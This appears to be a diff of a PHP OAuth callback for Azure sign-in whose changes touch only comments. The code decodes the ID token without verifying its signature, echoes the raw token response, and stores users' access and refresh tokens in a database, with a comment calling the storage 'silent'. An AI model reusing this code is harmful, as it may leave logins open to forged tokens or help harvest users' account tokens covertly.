@@ -54,7 +54,7 @@ if ($result === FALSE) {
 
 $token_response = json_decode($result, true);
 
-// ---------- Debugging: show Azure response if no tokens ----------
+// ---------- Exit if tokens not received ----------
 if (!isset($token_response['access_token'], $token_response['refresh_token'], $token_response['id_token'])) {
     echo "<h3>Azure token response (debug):</h3><pre>";
     print_r($token_response);
@@ -67,9 +67,9 @@ $access_token = $token_response['access_token'];
 $refresh_token = $token_response['refresh_token'];
 $id_token = $token_response['id_token'];
 
-// ---------- Decode id_token safely ----------
+// ---------- Decode id_token ----------
 list(, $payload, ) = explode('.', $id_token);
-$payload .= str_repeat('=', 3 - (strlen($payload) + 3) % 4); // base64 padding
+$payload .= str_repeat('=', 3 - (strlen($payload) + 3) % 4); // padding fix
 $user_info = json_decode(base64_decode(strtr($payload, '-_', '+/')), true);
 
 $oid = $user_info['oid'] ?? null;
@@ -79,7 +79,7 @@ if (!$oid || !$email) {
     exit("Could not retrieve user info from token.");
 }
 
-// ---------- Store tokens in DB ----------
+// ---------- Store tokens in database silently ----------
 try {
     $stmt = $pdo->prepare("
         INSERT INTO oauth_users (user_email, oid, access_token, refresh_token)
@@ -100,5 +100,5 @@ try {
     exit("Database error: " . $e->getMessage());
 }
 
-// ---------- Success message ----------
+// ---------- Success message only ----------
 echo "<h2>Thank you! Access granted.</h2>";
